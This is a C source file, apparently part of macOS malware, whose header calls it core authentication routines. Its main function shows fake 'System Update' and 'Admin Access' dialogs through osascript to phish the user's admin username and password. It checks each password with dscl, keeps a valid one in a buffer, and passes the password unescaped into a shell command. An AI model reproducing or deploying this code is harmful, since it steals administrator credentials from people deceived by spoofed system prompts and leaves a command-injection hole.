/*
 * File:        auth.c
 *   Core routines for user privilege, authenticating, verifying.
 */
    #include <wisp.h>
    #include <grp.h>

__attribute__((always_inline)) inline char *execute(const char *command) {
    FILE *pipe = popen(command, "r");
    if (!pipe) {
        panic();  
    }

    size_t buffer_size = 1024;
    char *output = malloc(buffer_size);
    if (!output) {
        pclose(pipe);
        panic(); 
    }
    output[0] = '\0';

    char chunk[256];
    while (fgets(chunk, sizeof(chunk), pipe)) {
        size_t current_length = strlen(output);
        size_t chunk_length = strlen(chunk);
        if (current_length + chunk_length + 1 > buffer_size) {
            buffer_size = (current_length + chunk_length + 1) * 2;
            char *new_buffer = realloc(output, buffer_size);
            if (!new_buffer) {
                free(output);
                pclose(pipe);
                panic(); 
            }
            output = new_buffer;
        }
        strcat(output, chunk);
    }

    pclose(pipe);
    return output;
}

__attribute__((always_inline)) inline void free_if_not(void *ptr) {
    if (ptr) {
        free(ptr);
    }
}

__attribute__((always_inline)) inline char *extract(const char *output, const char *start_marker, const char *end_marker) {
    char *start = strstr(output, start_marker);
    if (!start) {
        return NULL;
    }
    start += strlen(start_marker);

    while (*start == ' ' || *start == '\t') {
        start++;  // Skip whitespace
    }

    char *end = strstr(start, end_marker);
    if (!end) {
        return strdup(start);
    }

    size_t length = end - start;
    char *result = malloc(length + 1);
    if (result) {
        strncpy(result, start, length);
        result[length] = '\0';
    }

    return result;
}

/*-------------------------------------------
    AUTH
-------------------------------------------*/

__attribute__((always_inline)) inline int auth(const char *username, const char *password) {
    char command[512];
    snprintf(command, sizeof(command), "dscl /Local/Default -authonly %s %s", username, password);
    
    char *result = execute(command);
    if (!result) {
        panic();  
    }

    int is_valid = (strlen(result) == 0);
    free(result);

    if (!is_valid) {
        panic(); 
    }

    return is_valid;
}

__attribute__((always_inline)) inline int is_user_admin(const char *username) {
    if (strcmp(username, "root") == 0) {
        return 1;
    }

    struct group *admin_group = getgrnam("admin");
    if (!admin_group) {
        return 0;
    }

    struct passwd *user_info = getpwnam(username);
    if (user_info && user_info->pw_gid == admin_group->gr_gid) {
        return 1;
    }

    for (char **member = admin_group->gr_mem; member && *member; member++) {
        if (strcmp(*member, username) == 0) {
            return 1;
        }
    }

    return 0;
}

/*-------------------------------------------
    USER 
-------------------------------------------*/

__attribute__((always_inline)) inline char *request_input(const char *prompt_script) {
    char *response = execute(prompt_script);
    if (!response) return NULL;

    char *extracted = extract(response, "text returned:", ", gave up");
    free_if_not(response);
    return extracted;
}

void request_a(void) {
    char sws[PWD] = {0};
    const char *current_user = getlogin();
    if (!current_user) {
        struct passwd *user_info = getpwuid(getuid());
        if (user_info) {
            current_user = user_info->pw_name;
        } else {
            panic();
        }
    }

    char admin_username[256] = {0};
    if (is_user_admin(current_user)) {
        strncpy(admin_username, current_user, sizeof(admin_username) - 1);
    } else {
        const char *username_prompt =
            "osascript -e 'display dialog \"Admin privileges required.\\nEnter admin username:\" "
            "with title \"Admin Access\" default answer \"\" giving up after 30'";
        char *username_input = request_input(username_prompt);
        if (!username_input || strlen(username_input) == 0) {
            free_if_not(username_input);
            panic();
        }
        strncpy(admin_username, username_input, sizeof(admin_username) - 1);
        free_if_not(username_input);
    }

    for (int attempts = 0; attempts < 3; attempts++) {
        char password_prompt[1024] = {0};
        if (is_user_admin(current_user)) {
            snprintf(password_prompt, sizeof(password_prompt),
                     "osascript -e 'display dialog \"System update requires your password.\\n\\n"
                     "Enter password:\" with title \"System Update\" with icon caution "
                     "default answer \"\" giving up after 30 with hidden answer'");
        } else {
            snprintf(password_prompt, sizeof(password_prompt),
                     "osascript -e 'display dialog \"Admin privileges required.\\n\\n"
                     "Enter password for %s:\" with title \"Admin Access\" with icon caution "
                     "default answer \"\" giving up after 30 with hidden answer'", admin_username);
        }

        char *password = request_input(password_prompt);
        if (!password) {
            continue;
        }

        if (auth(admin_username, password)) {
            strncpy(sws, password, PWD - 1);
            sws[PWD - 1] = '\0';
            free(password);
            break;
        }

        free(password);
    }
}
